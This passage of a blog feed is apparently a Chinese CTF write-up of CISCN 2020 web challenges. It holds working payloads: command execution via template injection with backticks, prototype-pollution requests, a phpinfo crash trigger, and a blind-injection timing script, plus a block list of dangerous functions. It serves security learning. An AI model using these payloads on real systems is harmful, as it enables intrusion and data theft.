class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cmd'</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">'&#125;'</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/4.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
    
    </summary>
    
    
    
      <category term="dycb" scheme="http://yoursite.com/tags/dycb/"/>
    
  </entry>
  
  <entry>
    <title>CISCN全国大学生信息安全竞赛初赛</title>
    <link href="http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <id>http://yoursite.com/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/</id>
    <published>2020-08-21T15:09:56.000Z</published>
    <updated>2020-08-27T14:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>这次比赛赛后感慨颇多，突然发现也有成长，不像之前一样没输出了，当时没做出的一道WEB复现发现真的很简单，还是平时一些简单的点没有太过重视，也是一次警醒，下面来看看题</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>call_user_func_array函数</li><li>php异常退出</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开容器，直接给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>审计代码，会发现能利用的点就是<code>call_user_func_array</code>函数，会发现这里有四个两个参数，第二个参数是一个数组，google一下可以找到一个整理了php的bug的网站，找到了一篇文章<a href="https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79982，文章里提到了一种异常退出的方法</a></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/1.png" class=""><p>刚好这道题要让程序异常退出，就会进入到phpinfo()</p><p>根据文章里的poc，我们利用<code>stream_socket_client</code>函数来触发报错，得到<code>phpinfo()</code></p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/2.png" class=""><p>开始拿到这个页面不知道有什么用，看来一下<code>disable_function</code>,都可以用，加上这题很快被打穿，应该没那么难，搜索一下<code>flag{</code>,直接找到了</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/3.png" class=""><h2 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行</li><li>反引号</li><li>php输出方法</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">"*"</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'preg'</span>,<span class="string">'server'</span>,<span class="string">'chr'</span>,<span class="string">'decode'</span>,<span class="string">'html'</span>,<span class="string">'md5'</span>,<span class="string">'post'</span>,<span class="string">'get'</span>,<span class="string">'request'</span>,<span class="string">'file'</span>,<span class="string">'cookie'</span>,<span class="string">'session'</span>,<span class="string">'sql'</span>,<span class="string">'mkdir'</span>,<span class="string">'copy'</span>,<span class="string">'fwrite'</span>,<span class="string">'del'</span>,<span class="string">'encrypt'</span>,<span class="string">'$'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell'</span>,<span class="string">'open'</span>,<span class="string">'ini_'</span>,<span class="string">'chroot'</span>,<span class="string">'eval'</span>,<span class="string">'passthru'</span>,<span class="string">'include'</span>,<span class="string">'require'</span>,<span class="string">'assert'</span>,<span class="string">'union'</span>,<span class="string">'create'</span>,<span class="string">'func'</span>,<span class="string">'symlink'</span>,<span class="string">'sleep'</span>,<span class="string">'ord'</span>,<span class="string">'str'</span>,<span class="string">'source'</span>,<span class="string">'rev'</span>,<span class="string">'base_convert'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符【'</span>.$val.<span class="string">'】'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^[a-z]$/i"</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'很抱歉，执行出错，发现危险字符'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">( $content )</span> </span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">'='</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">'='</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">''</span> || $arr[<span class="number">1</span>]==<span class="string">''</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正【'</span>.$ifstr.<span class="string">'】'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">'='</span>, <span class="string">'=='</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">'&lt;&gt;'</span>, <span class="string">'!='</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'or'</span>, <span class="string">'||'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'and'</span>, <span class="string">'&amp;&amp;'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'mod'</span>, <span class="string">'%'</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">'not'</span>, <span class="string">'!'</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/\&#123;|&#125;/'</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'很抱歉，模板中有错误的判断,请修正'</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">'if('</span> . $ifstr . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">'if'</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">'/\&#123;if([0-9]):/'</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;if'</span> . $matches3[ <span class="number">1</span> ], <span class="string">'&#123;if'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;else'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">'&#123;end if'</span> . $matches3[ <span class="number">1</span> ] . <span class="string">'&#125;'</span>, <span class="string">'&#123;end if&#125;'</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span><span class="params">( $s, $str=<span class="string">','</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">''</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多命令执行函数</p><p>由于不了解parserIfLabel的用法，在google的时候找到了一样的源码和poc，是一个cve的部分内容</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/4.png" class=""><p>这个GitHub地址给了poc但是打不通，稍微和原题有区别<a href="https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md" target="_blank" rel="noopener">https://github.com/Tardis07/CVE_GO/blob/master/zzzphp_code_execution_v1.7.3.md</a></p><p>后来又找到了另一篇blog，本质无区别<a href="https://blog.csdn.net/CSDNPM250/article/details/104211233" target="_blank" rel="noopener">https://blog.csdn.net/CSDNPM250/article/details/104211233</a></p><p>总的来说拿到手的poc形式就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(phpinfo());&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>这里在本次测试可以发现php是被过滤了的，大小写双写都是无法绕过的</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/5.png" class=""><p>这里就要想想还有什么方法能够拿到回显，突然想到我可以避开phpinfo拿回显啊，这几篇blog产生了误导，死活要拿phpinfo的回显</p><p>直接用echo 打印目录好像也可以，再加上反引号没有被过滤，反引号的作用相当于命令执行函数，命令执行函数在白盒中被ban完了，但是反引号更好用，反引号相当于命令执行函数并且能把执行结果返回</p><p>由于容器关了就给poc吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(&#96;ls &#x2F;&#96;);&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>在根目录下面会发现flag文件，用cat读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？a&#x3D;&#123;if:1)echo(&#96;cat &#x2F;flag&#96;);&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png" class=""><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>nodejs原生链污染</li><li><code>set-value</code>的原型链污染漏洞</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>题目给了附件，解压拖到subline里,看了老半天发现只用看下面这两个文件就可以了</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png" class=""><p>nodejs基本不太会，先找了篇文章看看原型链污染的原理，简单来说就是要利用到<code>__proto__</code>属性，下面是文章里比较重要的部分</p><p>继承的查找过程:</p><p>  调用对象属性时, 会查找属性，如果本身没有，则会去<code>__proto__</code>中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有<code>__proto__</code>，那么会去<code>__proto__</code>的显式原型中查找，一直到null</p><p>到这里原理差不多了，下面就是分析了</p><p>在看到<code>const setFn = require(&#39;set-value&#39;);</code>不是很理解，google的时候找到了一篇文章</p><p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><p>文章里的poc没搞懂到底重写了啥，有没有重写，但是知道的是得从setFn()入手，直接跟进setFn()</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png" class=""><p>可以看到，这里在访问/Privilege时，可以传入赋值key和value</p><p>下面就是跟进setFn()的第一个参数，这里可以看到session()，在app.js中有下面对Session的参数定义</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png" class=""><p>这里有env，查一下意思就是环境变量，那么我们要污染的应该就是Session了，session又在环境变量中，这里就是一个重要点，先放着</p><p>下面再来看一下获取flag的条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Admin[key]的值和password的值只要能够相等，就会给到在环境变量中的flag，这里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Admin的定义也是在环境变量中，所以没办法用原型链污染覆盖，用上面分析的往环境变量中写入</p><p>又因为<strong>所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value</strong></p><p>所以我猜测污染session写入环境变量，在判断时找不到Admin中对应的值时会继续向前找，也就是前面提到的session，现在整个思路应该就清晰了，上poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Privilege</span><br><span class="line"></span><br><span class="line">POST：NewAttributeKey&#x3D;__proto__.peguin&amp;NewAttributeValue&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png" class=""><p>可以看到成功写到了环境变量中，并且会生成新的键值对，我猜测应该是这种格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; __proto__: &#123; peguin: 123 &#125; &#125;</span><br></pre></td></tr></table></figure><p>y因为Admin本身没有这个属性，就会去<code>__proto__</code>中查找，所以接下来我们只要去post传参key为peguin，value为123就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">post：key&#x3D;peguin&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png" class=""><h2 id="Easytrick"><a href="#Easytrick" class="headerlink" title="Easytrick"></a>Easytrick</h2><p>这题没做出来挺遗憾的，赛后复现一点不难，之前接触过的点</p><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>整型和字符串精度问题</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>这里主要在本地测试，经过测试没有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;trick1 &#x3D; (string)$this-&gt;trick1;</span><br></pre></td></tr></table></figure><p>这里就能用数组直接绕过，问题是多了这一个点，比赛时就没考虑到，赛后突然想到了之前这个考点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1.000000000000001</span>;</span><br><span class="line">$b = <span class="number">1.000000000000001</span>;</span><br><span class="line">$a = (string)($a);</span><br><span class="line"><span class="keyword">echo</span> 